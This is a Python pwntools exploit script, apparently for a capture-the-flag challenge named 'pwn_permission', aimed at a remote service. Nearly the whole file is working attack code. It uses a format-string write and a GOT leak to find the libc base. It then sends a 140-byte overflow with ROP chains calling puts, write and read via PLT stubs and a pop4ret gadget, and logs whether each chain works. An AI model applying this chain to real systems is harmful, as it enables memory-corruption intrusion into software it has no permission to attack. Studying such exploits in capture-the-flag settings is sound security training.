from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# The simple puts ROP works but read ROP doesn't
# Let me check if read@plt is the correct address

# Check PLT entries
from capstone import Cs, CS_ARCH_X86, CS_MODE_32
md = Cs(CS_ARCH_X86, CS_MODE_32)

# read@plt should be at 0x8049040
log.info("read@plt (0x8049040):")
data = elf.read(0x8049040, 16)
for insn in md.disasm(data, 0x8049040):
    log.info(f"0x{insn.address:x}:\t{insn.mnemonic}\t{insn.op_str}")

# write@plt should be at 0x8049080
log.info("\nwrite@plt (0x8049080):")
data = elf.read(0x8049080, 16)
for insn in md.disasm(data, 0x8049080):
    log.info(f"0x{insn.address:x}:\t{insn.mnemonic}\t{insn.op_str}")

# puts@plt should be at 0x8049060
log.info("\nputs@plt (0x8049060):")
data = elf.read(0x8049060, 16)
for insn in md.disasm(data, 0x8049060):
    log.info(f"0x{insn.address:x}:\t{insn.mnemonic}\t{insn.op_str}")

# Check the PLT stub format
# In 32-bit ELF, PLT entries typically look like:
# jmp [GOT_entry]
# push index
# jmp PLT0

# Let me also check if the issue is with the payload size
# vuln reads 0x100 = 256 bytes
# Our payload with read + pop4ret + write + pop4ret is 204 bytes
# That should fit

# Let me try a simpler ROP: just read(0, bss_buf, 8) with no follow-up
# If read works, the program should just crash after read returns
# (because there's no valid return address)

# But wait, the issue might be that read@plt is not resolving correctly
# because the GOT entry for read might not have been resolved yet

# In a typical ELF binary, functions are resolved lazily
# If read hasn't been called before through the PLT, its GOT entry
# points back to the PLT stub (lazy resolver)

# But vuln DOES call read(0, buf, 0x100), so read@GOT should be resolved

# Let me check read@GOT
read_got = elf.got['read']
log.info(f"\nread@GOT: 0x{read_got:x}")

# The issue might be something else entirely
# Let me try a minimal ROP chain: just read_plt with no cleanup

target_val_addr = 0x804c030
puts_got = elf.got['puts']
got_base = 0x804c000
bss_buf = 0x804c040
read_plt = elf.plt['read']
puts_plt = elf.plt['puts']

PUTS_OFFSET = 0x6d1e0

# Format string
fmt_payload = b'%5c%7$hhnAAA'
fmt_payload += p32(target_val_addr)
fmt_payload += p32(puts_got)
fmt_payload += b'%8$s'

import time

# Test 1: Simple puts (works)
log.info("=== Test 1: Simple puts ROP ===")
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

# Simple puts ROP
payload = b'A' * 140
payload += p32(got_base)
payload += p32(bss_buf)
payload += p32(puts_plt)
payload += p32(0xdeadbeef)
payload += p32(0x804a058)  # "Hope you have a good time here."

conn.send(payload)
time.sleep(1)

try:
    resp = conn.recv(timeout=3)
    log.info(f"puts ROP: {resp}")
    if b'Hope' in resp:
        log.success("puts ROP works!")
except:
    log.info("puts ROP failed")

conn.close()

# Test 2: write(1, puts_got, 4) with pop4ret cleanup
log.info("\n=== Test 2: write ROP with pop4ret ===")
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

write_plt = elf.plt['write']
pop4ret = 0x8049380

payload = b'A' * 140
payload += p32(got_base)
payload += p32(bss_buf)
payload += p32(write_plt)
payload += p32(pop4ret)
payload += p32(1)
payload += p32(puts_got)
payload += p32(4)

conn.send(payload)
time.sleep(1)

try:
    resp = conn.recv(4, timeout=3)
    log.info(f"write ROP: {resp.hex()}")
    addr = u32(resp)
    log.info(f"Leaked via write: 0x{addr:x}")
    if addr == puts_leak:
        log.success("write ROP with pop4ret works!")
except Exception as e:
    log.info(f"write ROP failed: {e}")

conn.close()

# Test 3: read(0, bss_buf, 4) with pop4ret cleanup, then write
log.info("\n=== Test 3: read -> write ROP ===")
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

# read(0, bss_buf, 4) -> write(1, bss_buf, 4)
payload = b'A' * 140
payload += p32(got_base)
payload += p32(bss_buf)
payload += p32(read_plt)
payload += p32(pop4ret)
payload += p32(0)
payload += p32(bss_buf)
payload += p32(4)
# After pop4ret: pop 4 values + ret
payload += p32(0)  # ebx
payload += p32(0)  # esi
payload += p32(0)  # edi
payload += p32(bss_buf)  # ebp
# write
payload += p32(write_plt)
payload += p32(pop4ret)
payload += p32(1)
payload += p32(bss_buf)
payload += p32(4)

log.info(f"Payload length: {len(payload)}")

conn.send(payload)
time.sleep(1)

# Send test data
conn.send(b'TEST')
time.sleep(1)

try:
    resp = conn.recv(timeout=3)
    log.info(f"read->write ROP: {resp}")
    if b'TEST' in resp:
        log.success("read->write ROP works!")
except Exception as e:
    log.info(f"read->write ROP failed: {e}")

conn.close()